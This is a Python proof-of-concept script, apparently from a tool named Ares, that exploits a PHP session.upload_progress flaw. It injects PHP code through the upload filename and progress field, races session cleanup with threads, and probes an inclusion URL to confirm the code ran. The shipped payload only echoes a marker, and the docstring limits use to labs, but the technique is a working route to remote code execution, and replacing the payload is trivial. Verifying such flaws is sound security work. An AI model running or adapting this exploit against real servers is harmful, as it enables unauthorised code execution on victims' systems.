#!/usr/bin/env python3
"""
verify_session_injection.py — Verify PHP session.upload_progress injection.

Tests CVE-2026-109618/109619: PHP's session.upload_progress feature writes
the filename field into session data without sanitization when
session.upload_progress.enabled=On (default). By racing the cleanup, an
attacker can inject PHP code via the filename and include the session file.

Authorized lab environments only. Never run against production or non-consenting systems.

Usage: python verify_session_injection.py --target https://lab.internal/upload.php
       --session-url https://lab.internal/index.php --marker <token>
"""
from __future__ import annotations

import argparse
import hashlib
import json
import os
import re
import sys
import threading
import time
import urllib.parse
import urllib.request


# Minimal verification payload — single echo + exit, no shell, no persistence
_INJECT_TEMPLATE = "<?php echo 'ARES_SESSION_{marker}'; ?>"
_SESSION_PREFIX = "PHP_SESSION_UPLOAD_PROGRESS"


def _fetch(url: str, cookies: str = "", timeout: int = 10) -> tuple[int, str]:
    try:
        headers = {"User-Agent": "Ares/verify-session-injection 1.0"}
        if cookies:
            headers["Cookie"] = cookies
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, resp.read(8192).decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, ""
    except Exception as exc:
        return 0, str(exc)


def _upload_with_injection(
    upload_url: str,
    phpsessid: str,
    marker: str,
    inject_payload: str,
    timeout: int,
) -> tuple[int, str]:
    """POST a multipart upload with the malicious filename in the progress key."""
    boundary = f"AresBoundary{marker}"
    # The PHP_SESSION_UPLOAD_PROGRESS field triggers session write with our filename
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="{_SESSION_PREFIX}"\r\n\r\n'
        f"{inject_payload}\r\n"
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="file"; '
        f'filename="{inject_payload}"\r\n'
        f"Content-Type: application/octet-stream\r\n\r\nA\r\n"
        f"--{boundary}--\r\n"
    ).encode()
    try:
        req = urllib.request.Request(
            upload_url,
            data=body,
            headers={
                "Content-Type": f"multipart/form-data; boundary={boundary}",
                "Cookie": f"PHPSESSID={phpsessid}",
                "User-Agent": "Ares/verify-session-injection 1.0",
            },
            method="POST",
        )
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, resp.read(1024).decode("utf-8", errors="replace")
    except Exception as exc:
        return 0, str(exc)


def verify_session_injection(
    upload_url: str,
    include_url: str,
    timeout: int = 15,
    race_threads: int = 5,
    race_attempts: int = 30,
) -> dict:
    """
    Race the session cleanup to achieve PHP code execution via session injection.

    Returns a result dict with keys: vulnerable, marker, evidence, details.
    """
    marker = hashlib.sha256(os.urandom(16)).hexdigest()[:16].upper()
    inject_payload = _INJECT_TEMPLATE.format(marker=marker)
    expected = f"ARES_SESSION_{marker}"
    phpsessid = hashlib.sha256(os.urandom(16)).hexdigest()[:26]

    found = threading.Event()
    evidence = {"body": "", "attempt": 0}

    def upload_worker() -> None:
        while not found.is_set():
            _upload_with_injection(upload_url, phpsessid, marker, inject_payload, timeout)
            time.sleep(0.05)

    def probe_worker() -> None:
        cookie = f"PHPSESSID={phpsessid}"
        for attempt in range(race_attempts):
            if found.is_set():
                break
            status, body = _fetch(include_url, cookies=cookie, timeout=timeout)
            if expected in body:
                evidence["body"] = body[:500]
                evidence["attempt"] = attempt
                found.set()
                break
            time.sleep(0.1)

    # Start upload threads
    uploaders = [threading.Thread(target=upload_worker, daemon=True) for _ in range(race_threads)]
    for t in uploaders:
        t.start()

    # Probe for execution
    probe_worker()
    found.set()  # stop uploaders

    if evidence["body"]:
        return {
            "vulnerable": True,
            "marker": marker,
            "phpsessid": phpsessid,
            "include_url": include_url,
            "evidence": evidence["body"],
            "race_attempt": evidence["attempt"],
        }

    return {
        "vulnerable": False,
        "marker": marker,
        "note": "Session injection not triggered within race window",
        "attempts": race_attempts,
    }


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Verify PHP session upload_progress injection — lab only"
    )
    parser.add_argument("--target", required=True, help="Upload endpoint URL")
    parser.add_argument("--session-url", required=True,
                        help="URL that triggers session file inclusion")
    parser.add_argument("--timeout", type=int, default=15)
    parser.add_argument("--threads", type=int, default=5, help="Upload race threads")
    parser.add_argument("--attempts", type=int, default=30, help="Probe attempts")
    args = parser.parse_args()

    print(f"[verify_session_injection] target={args.target}", file=sys.stderr)
    result = verify_session_injection(
        args.target, args.session_url,
        timeout=args.timeout, race_threads=args.threads, race_attempts=args.attempts,
    )
    print(result.get("evidence") or result.get("note", ""))
    print(json.dumps(result, indent=2))
    sys.exit(0 if result["vulnerable"] else 1)


if __name__ == "__main__":
    main()
